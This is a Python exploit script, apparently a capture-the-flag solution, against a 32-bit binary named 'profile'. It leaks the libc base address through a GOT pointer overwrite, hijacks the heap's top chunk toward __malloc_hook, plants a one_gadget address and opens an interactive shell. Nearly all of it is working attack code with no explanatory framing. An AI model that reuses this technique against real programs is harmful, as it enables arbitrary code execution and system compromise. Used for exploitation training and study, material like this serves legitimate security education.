#coding:utf-8
from PwnContext.core import *

context.log_level = 'debug'


binary = './profile'
debug_libc = './libc.so.6'
ctx.binary = binary
ctx.remote_libc = debug_libc
elf = ELF(binary)
libc = ELF(debug_libc)
ctx.debug_remote_libc = True
p = ctx.start()

def create(length,name,age):
	p.recvuntil('>')
	p.sendline('1')
	p.recvuntil('name len:\n')
	p.sendline(str(length))
	p.recvuntil('name:\n')
	p.sendline(name)
	p.recvuntil(' age:\n')
	p.sendline(age)

def printf():
	p.recvuntil('>')
	p.sendline('2')

def update(length,name,age):
	p.recvuntil('>')
	p.sendline('3')
	p.recvuntil('namelen:\n')
	p.sendline(str(length))
	p.recvuntil(' name:')
	p.send(name)
	p.recvuntil('age:')
	p.sendline(age)

def exchange(p1,p2):
	p.recvuntil('>')
	p.sendline('4')
	p.recvuntil('Person 1: ')
	p.send(p1)
	p.recvuntil('Person 2: ')
	p.send(p2)

#leak libc
puts_got = elf.got['puts']
printf_got = elf.got['printf']
atoi_got = elf.got['atoi']
create(0x10,'aaaa','1')
update(-1,p32(puts_got),'1')
printf()
p.recvuntil('name: ')
libc_base = u32(p.recv(4)) - libc.symbols['puts']
log.success('libc_base addr : 0x%x'%libc_base)
topchunk_addr = libc_base + 0x1ad420 + 48
log.success('topchunk addr : 0x%x'%topchunk_addr)
malloc_hook = libc_base + libc.symbols['__malloc_hook']
log.success('malloc_hook addr : 0x%x'%malloc_hook)
one_gadget = libc_base + 0x401b3
log.success('one_gadget addr : 0x%x'%one_gadget)

#hijack main_arena->topchunk -> __malloc_hook
exchange(p32(topchunk_addr-12),p32(malloc_hook-0x4c))
update(0x50,'a'*0x44+p32(one_gadget),'1')

#trigger one_gadegt
p.recvuntil('>')
p.sendline('3')
p.recvuntil('namelen:\n')
p.sendline('20')

p.interactive()
